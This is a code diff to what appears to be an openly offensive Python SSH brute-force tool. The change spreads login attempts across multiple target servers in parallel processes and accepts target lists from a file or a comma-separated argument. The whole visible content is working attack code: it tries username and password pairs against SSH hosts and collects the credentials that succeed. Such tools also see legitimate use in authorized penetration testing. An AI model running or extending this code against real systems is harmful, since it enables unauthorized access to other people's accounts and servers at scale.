@@ -48,45 +48,46 @@ def login(ssh_server, port, user, password):
     except Exception as err:
         t2 = time()
         return err, '', t2-t1
-def brute_force(thread_index, ssh_server, port, credentials):
+def brute_force(process_index, ssh_servers, port, credentials):
     successful_logins = {}
     for credential in credentials:
-        status = ['']
-        while status[0] != True and status[0] != False:
-            status = login(ssh_server, port, credential[0], credential[1])
-            if status[0] == True:
-                successful_logins[credential[0]] = credential[1]
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
-            elif status[0] == False:
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
-            else:
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
-                if ignore_errors:
-                    break
+        for ssh_server in ssh_servers:
+            status = ['']
+            while status[0] != True and status[0] != False:
+                status = login(ssh_server, port, credential[0], credential[1])
+                if status[0] == True:
+                    successful_logins[credential[0]] = credential[1]
+                    with lock:
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+                elif status[0] == False:
+                    with lock:
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                else:
+                    with lock:
+                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                    if ignore_errors:
+                        break
     return successful_logins
-def main(server, port, credentials):
+def main(servers, port, credentials):
     successful_logins = {}
-    thread_count = cpu_count()
-    pool = Pool(thread_count)
-    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
-    display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
-    threads = []
-    credentials_count = len(credentials)
-    credential_groups = [credentials[group*credentials_count//thread_count: (group+1)*credentials_count//thread_count] for group in range(thread_count)]
-    for index, credential_group in enumerate(credential_groups):
-        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group)))
-    for thread in threads:
-        successful_logins.update(thread.get())
+    process_count = cpu_count()
+    pool = Pool(process_count)
+    display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processes{Back.RESET}")
+    display(':', f"Credentials / Processes = {Back.MAGENTA}{len(credentials)//process_count}{Back.RESET}")
+    processes = []
+    total_servers = len(servers)
+    server_divisions = [servers[group*total_servers//process_count: (group+1)*total_servers//process_count] for group in range(process_count)]
+    for index, server_division in enumerate(server_divisions):
+        processes.append(pool.apply_async(brute_force, (index, server_division, port, credentials, )))
+    for process in processes:
+        successful_logins.update(process.get())
     pool.close()
     pool.join()
-    display('+', f"Threads Finished Excuting")
+    display('+', f"Processes Finished Excuting")
     return successful_logins
 
 if __name__ == "__main__":
-    arguments = get_arguments(('-s', "--server", "server", "Target SSH Server"),
+    arguments = get_arguments(('-s', "--server", "server", "Target SSH Servers (seperated by ',' or File Name)"),
                               ('-p', "--port", "port", f"Port of Target SSH Server (Default={port})"),
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
@@ -96,6 +97,15 @@ if __name__ == "__main__":
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
         exit(0)
+    else:
+        try:
+            with open(arguments.server, 'r') as file:
+                arguments.server = [server for server in file.read().split('\n') if server != '']
+        except FileNotFoundError:
+            arguments.server = arguments.server.split(',')
+        except Exception as error:
+            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
+            exit(0)
     if not arguments.port:
         arguments.port = port
     else:
